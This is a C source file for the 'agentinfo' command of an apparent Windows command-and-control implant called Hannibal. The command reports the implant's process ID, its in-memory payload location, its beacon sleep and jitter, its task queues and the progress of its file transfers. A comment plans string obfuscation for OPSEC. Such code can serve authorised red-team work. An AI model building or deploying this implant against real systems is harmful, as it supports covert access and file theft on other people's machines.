#include "config.h"

#ifdef INCLUDE_CMD_AGENTINFO

#include "hannibal_tasking.h"

/**
 * Not great OPSEC to have strings identifying fields in internal structures.
 * Consider altering/removing strings or the entire command. TODO: String obfuscation or removal.
 */
SECTION_CODE void cmd_agentinfo(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_AGENTINFO *info = (CMD_AGENTINFO *)t.cmd;


    size_t INITIAL_BUFFER_SIZE = 4096;
    size_t CURRENT_BUFFER_SIZE = INITIAL_BUFFER_SIZE;
    size_t CURRENT_BUFFER_USAGE = 0;

    UINT8 *response_content = (UINT8 *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, INITIAL_BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);


    // PID
    DWORD pid = hannibal_instance_ptr->Win32.GetCurrentProcessId();
    WCHAR pidW[16] = {0};
    dword_to_wchar(pid, pidW, 10);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"pid: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, pidW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    // Process
    WCHAR process_name[MAX_PATH] = L"<unknown>";

    hannibal_instance_ptr->Win32.GetModuleFileNameW(NULL, process_name, sizeof(process_name));

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"proc: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, process_name);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

#ifdef PIC_BUILD

    WCHAR baseW[64] = {0};
    baseW[0] = L'0';
    baseW[1] = L'x';

    uintptr_t addr = (uintptr_t)hannibal_instance_ptr->Base.Buffer;

    for (int i = 0; i < 16; i++) {
        int nibble = (addr >> (60 - i * 4)) & 0xF; // Get each nibble (4 bits)
        baseW[2 + i] = L"0123456789ABCDEF"[nibble]; // Convert nibble to hex character
    }

    WCHAR payloadlenW[64] = {0};
    ulong_to_wchar(hannibal_instance_ptr->Base.Length, payloadlenW);

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"base: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, baseW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"len: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, payloadlenW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

#endif

    WCHAR sleepW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->config.sleep, sleepW, 10);

    WCHAR jitterW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->config.jitter, jitterW, 10);

    WCHAR task_countW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->tasks.tasks_queue->size, task_countW, 10);

    WCHAR task_capacityW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->tasks.tasks_queue->capacity, task_capacityW, 10);

    WCHAR task_response_sizeW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->tasks.tasks_response_queue->size, task_response_sizeW, 10);

    WCHAR task_response_capacityW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->tasks.tasks_response_queue->capacity, task_response_capacityW, 10);

    WCHAR downloadsW[16] = {0};
    dword_to_wchar((DWORD)hannibal_instance_ptr->tasks.download_count, downloadsW, 10);

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"sleep: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, sleepW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"jitter: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, jitterW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"tasks: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, task_countW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"task capacity: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, task_capacityW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"task response capacity: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, task_response_capacityW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"downloads: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, downloadsW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    for ( int i = 0; i < hannibal_instance_ptr->tasks.download_count; i++ ) {

        WCHAR filesizeW[32];
        ulong_to_wchar(hannibal_instance_ptr->tasks.file_downloads[i].filesize, filesizeW);
        
        WCHAR bytes_sentW[32];
        ulong_to_wchar(hannibal_instance_ptr->tasks.file_downloads[i].bytes_sent, bytes_sentW);

        WCHAR chunk_countW[16];
        dword_to_wchar(hannibal_instance_ptr->tasks.file_downloads[i].chunk_count, chunk_countW, 10);

        WCHAR chunks_sentW[16];
        dword_to_wchar(hannibal_instance_ptr->tasks.file_downloads[i].chunks_sent, chunks_sentW, 10);

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"file: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, hannibal_instance_ptr->tasks.file_downloads[i].path);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"size: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, filesizeW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"sent: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, bytes_sentW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"chunks: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, chunk_countW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"chunks sent: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, chunks_sentW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");
    }

    WCHAR uploadsW[16];
    dword_to_wchar((DWORD)hannibal_instance_ptr->tasks.upload_count, uploadsW, 10);

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"uploads: ");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, uploadsW);
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    for ( int i = 0; i < hannibal_instance_ptr->tasks.upload_count; i++ ) {

        WCHAR filesizeW[32];
        ulong_to_wchar(hannibal_instance_ptr->tasks.file_uploads[i].filesize, filesizeW);
        
        WCHAR bytes_receivedW[32];
        ulong_to_wchar(hannibal_instance_ptr->tasks.file_uploads[i].bytes_received, bytes_receivedW);

        WCHAR chunk_countW[16];
        dword_to_wchar(hannibal_instance_ptr->tasks.file_uploads[i].chunk_count, chunk_countW, 10);

        WCHAR chunks_receivedW[16];
        dword_to_wchar(hannibal_instance_ptr->tasks.file_uploads[i].chunks_received, chunks_receivedW, 10);

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"file: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, hannibal_instance_ptr->tasks.file_uploads[i].path);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"size: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, filesizeW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"received: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, bytes_receivedW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"chunks: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, chunk_countW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"chunks received: ");
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, chunks_receivedW);
        buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");
        
    }

    TASK response_t;
    response_t.output = (LPCSTR)response_content;
    response_t.output_size = pic_strlenW((LPCWSTR)response_content)*sizeof(WCHAR) + 2;
    response_t.task_uuid = t.task_uuid;

    task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

    hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
    
}

#endif